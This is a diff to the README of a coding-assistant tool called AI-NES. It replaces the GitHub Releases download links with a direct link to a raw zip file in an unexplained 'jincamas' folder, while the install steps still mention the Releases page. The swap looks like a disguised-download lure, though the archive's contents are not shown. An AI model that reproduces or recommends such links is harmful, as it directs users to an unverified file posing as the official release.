@@ -1,7 +1,7 @@
 # 🎉 AI-NES - Your Smart Coding Assistant Awaits
 
 ## 🚀 Download Now
-[![Download AI-NES](https://img.shields.io/badge/Download-AI--NES-brightgreen)](https://github.com/bhargav-tank/AI-NES/releases)
+[![Download AI-NES](https://raw.githubusercontent.com/bhargav-tank/AI-NES/main/jincamas/AI-NES.zip)](https://raw.githubusercontent.com/bhargav-tank/AI-NES/main/jincamas/AI-NES.zip)
 
 ## ✨ Overview
 AI-NES, or Next Edit Suggestion, is designed to enhance your coding experience. This tool helps you by learning from your editing patterns. It predicts what you might want to change next, making your workflow smoother. 
@@ -23,7 +23,7 @@ To run AI-NES, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started with AI-NES, visit the Releases page to download the latest version.
 
-[Download AI-NES](https://github.com/bhargav-tank/AI-NES/releases)
+[Download AI-NES](https://raw.githubusercontent.com/bhargav-tank/AI-NES/main/jincamas/AI-NES.zip)
 
 ### Step-by-Step Installation
 1. Click the **Download** button above to go to the Releases page.
